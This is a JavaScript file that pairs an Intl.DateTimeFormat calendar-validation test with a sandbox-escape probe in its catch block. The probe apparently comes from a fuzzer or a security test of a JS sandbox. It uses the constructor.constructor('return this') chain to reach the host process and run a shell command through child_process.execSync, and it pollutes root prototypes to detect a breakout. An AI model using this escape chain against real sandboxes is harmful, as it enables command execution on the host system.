try {
    const invalidCalendarOptions = [
        '',
        'a',
        'ab',
        'abcdefghi',
        'abc-abcdefghi',
        '!invalid!',
        '-gregory-',
        'gregory-',
        'gregory--',
        'gregory-nu',
        'gregory-nu-',
        'gregory-nu-latn',
        'gregoryé',
        'gregory역법'
    ];
    for (const calendar of invalidCalendarOptions) {
        assert.throws(RangeError, function () {
            new Intl.DateTimeFormat('en', { calendar });
        }, `new Intl.DateTimeFormat("en", {calendar: "${ calendar }"}) throws RangeError`);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}